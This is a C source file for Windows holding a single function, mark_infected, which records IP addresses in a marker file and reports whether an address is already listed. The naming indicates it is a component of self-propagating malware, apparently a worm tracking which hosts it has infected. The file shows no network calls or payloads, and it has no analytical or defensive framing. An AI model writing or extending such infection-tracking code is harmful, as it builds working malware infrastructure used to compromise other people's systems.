#include <windows.h>
#include <stddef.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    size_t ip_len;
    unsigned char buffer[4096];
    DWORD bytes_read;
    unsigned char last_byte = 0;
    int have_bytes = 0;
    size_t line_pos = 0;
    int line_equal = 1;
    int pending_cr = 0;

    if (ip == NULL)
        return -1;

    ip_len = strlen(ip);
    if (ip_len == 0 || strchr(ip, '\n') != NULL || strchr(ip, '\r') != NULL)
        return -1;

    file = CreateFileA(SELF_MARKER, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            CloseHandle(file);
            return -1;
        }
        if (bytes_read == 0)
            break;

        have_bytes = 1;
        last_byte = buffer[bytes_read - 1];

        for (i = 0; i < bytes_read; ++i) {
            unsigned char c = buffer[i];

            if (c == '\n') {
                if (line_equal && line_pos == ip_len) {
                    CloseHandle(file);
                    return 1;
                }
                line_pos = 0;
                line_equal = 1;
                pending_cr = 0;
                continue;
            }

            if (pending_cr) {
                if (line_pos < ip_len) {
                    if ((unsigned char)ip[line_pos] != '\r')
                        line_equal = 0;
                    ++line_pos;
                } else {
                    line_equal = 0;
                }
                pending_cr = 0;
            }

            if (c == '\r') {
                pending_cr = 1;
            } else if (line_pos < ip_len) {
                if ((unsigned char)ip[line_pos] != c)
                    line_equal = 0;
                ++line_pos;
            } else {
                line_equal = 0;
            }
        }
    }

    if (line_equal && line_pos == ip_len) {
        CloseHandle(file);
        return 1;
    }

    {
        LARGE_INTEGER end;
        end.QuadPart = 0;
        if (!SetFilePointerEx(file, end, NULL, FILE_END)) {
            CloseHandle(file);
            return -1;
        }
    }

    if (have_bytes && last_byte != '\n') {
        unsigned char newline = '\n';
        DWORD written = 0;
        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    {
        size_t offset = 0;
        while (offset < ip_len) {
            DWORD chunk = (ip_len - offset > 0xFFFFFFFFUL)
                              ? 0xFFFFFFFFUL
                              : (DWORD)(ip_len - offset);
            DWORD written = 0;
            if (!WriteFile(file, ip + offset, chunk, &written, NULL) ||
                written == 0) {
                CloseHandle(file);
                return -1;
            }
            offset += written;
        }
    }

    {
        unsigned char newline = '\n';
        DWORD written = 0;
        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    if (!CloseHandle(file))
        return -1;

    return 0;
}